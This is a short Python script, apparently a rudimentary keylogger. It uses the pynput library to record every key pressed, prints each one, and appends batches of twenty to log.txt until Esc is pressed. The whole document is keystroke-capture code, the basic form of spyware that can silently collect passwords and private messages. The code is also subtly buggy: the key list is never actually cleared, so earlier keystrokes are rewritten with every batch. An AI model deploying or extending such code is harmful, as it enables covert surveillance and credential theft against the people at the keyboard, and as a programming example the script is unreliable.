import pynput

from pynput.keyboard import Key, Listener

count = 0
keys = []

def onpress(key):
    global keys, count

    keys.append(key)
    count += 1
    print("{0} pressed".format(key))

    if count >= 20:
        count = 0
        writefile(str(keys))
        key = []

def writefile(keys):
    with open("log.txt", "a") as f:
        for key in keys:
            f.write(key)

def onrelease(key):
    if key == Key.esc:
        return False



with Listener(on_press=onpress,on_release=onrelease) as listner:
    listner.join()
